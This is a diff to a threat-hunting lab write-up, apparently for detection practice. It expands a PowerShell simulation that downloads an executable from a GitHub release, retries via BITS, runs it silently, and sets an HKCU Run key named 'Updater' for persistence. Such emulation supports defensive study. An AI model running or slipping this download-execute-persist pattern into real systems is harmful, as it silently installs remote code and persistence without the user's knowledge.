@@ -30,12 +30,60 @@ If an adversary abused PowerShell to download and silently execute an `.exe` fro
 ## 4. Actions Performed
 1. **Simulation:**
    ```powershell
-   $uri  = "https://<labhost>/7z2408-x64.exe"
-   $out  = "C:\\ProgramData\\7z2408-x64.exe"
-   Invoke-WebRequest -Uri $uri -OutFile $out
-   Start-Process $out -ArgumentList "/S" -Wait
-   New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
-     -Name "Updater" -Value "C:\\ProgramData\\7z2408-x64.exe" -PropertyType String -Force
+# Lab script using GitHub release URL
+$uri = "https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"
+$out = "C:\ProgramData\7z2408-x64.exe"
+
+Write-Host "Testing connectivity to $uri ..."
+try { $uriObj = [uri]$uri } catch { Write-Error "Invalid URI"; exit 1 }
+
+# Test connection (HEAD)
+try {
+    $r = Invoke-WebRequest -Uri $uri -Method Head -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+    Write-Host "HEAD OK: $($r.StatusCode)"
+} catch {
+    Write-Warning "HEAD failed: $($_.Exception.Message) -- will try GET"
+}
+
+# Try download
+try {
+    Write-Host "Downloading via Invoke-WebRequest..."
+    Invoke-WebRequest -Uri $uri -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
+    Write-Host "Downloaded to $out"
+} catch {
+    Write-Warning "Invoke-WebRequest failed: $($_.Exception.Message)"
+    try {
+        Write-Host "Trying BITS fallback..."
+        Start-BitsTransfer -Source $uri -Destination $out -ErrorAction Stop
+        Write-Host "BITS download completed"
+    } catch {
+        Write-Error "BITS failed: $($_.Exception.Message). Exiting."
+        exit 1
+    }
+}
+
+# Confirm file
+if (-not (Test-Path $out)) { Write-Error "Download didn't produce file. Exiting."; exit 1 }
+
+# Optional: compute SHA256 for record
+try { Get-FileHash -Path $out -Algorithm SHA256 } catch {}
+
+# Run silently (for installers that accept /S)
+try {
+    Start-Process -FilePath $out -ArgumentList "/S" -Wait -ErrorAction Stop
+    Write-Host "Process executed (silent argument)."
+} catch {
+    Write-Warning "Start-Process failed (maybe not an installer): $($_.Exception.Message)"
+}
+
+# Persistence (HKCU Run key)
+try {
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $out -PropertyType String -Force
+    Write-Host "Created Run key -> $out"
+} catch {
+    Write-Warning "Failed to create Run key: $($_.Exception.Message)"
+}
+
    ```
 
 2. **Hunting Queries Executed:**
